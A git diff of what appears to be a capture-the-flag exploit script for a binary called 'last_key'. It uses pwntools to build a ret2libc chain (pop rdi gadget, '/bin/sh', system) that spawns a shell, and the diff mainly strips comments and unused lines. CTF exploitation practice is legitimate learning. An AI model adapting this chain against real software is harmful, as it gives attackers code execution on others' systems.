@@ -6,23 +6,14 @@ import os
 import signal
 from pwn import u64, p64, hexdump, ELF, process, gdb
 
-deadcode = p64(0xdeadc0dedeadc0de)
-
 puts_plt = p64(0x401100)
 alarm_got = p64(0x403f98)
 
 # 0x000000000040178d : pop rdi ; ret
 pop_rdi_ret = p64(0x40178d)
 ret = p64(0x40178e)
-
-# 0x0000000000401687  set_score
-# can go back to here if I want to send my payload again
-set_score = p64(0x401687)
 main_func = p64(0x401794)
 
-# set_score_read = p64(0x401708)
-
-# cheating with pwntools
 e    = ELF("./last_key")
 libc = ELF('./glibc/libc.so.6')
 
@@ -72,7 +63,6 @@ def main(launch_gdb=True):
     # set libc base
     libc.address = libc_base
     system = p64(libc.symbols.system)
-    execve = p64(libc.symbols.execve)
     libc_exit = p64(libc.symbols.exit)
     bin_sh = p64(next(libc.search(b'/bin/sh\x00')))
 
@@ -99,12 +89,8 @@ def main(launch_gdb=True):
     payload += pop_rdi_ret
     payload += bin_sh
     payload += system
-    # jump to execve did not work, probably some extra stuff in the regs
-    # that doesnt play nice with the args that its expecting
-    # payload += execve
     payload += libc_exit
 
-    print(hexdump(payload))
     p.sendline(payload)
     p.interactive()
 
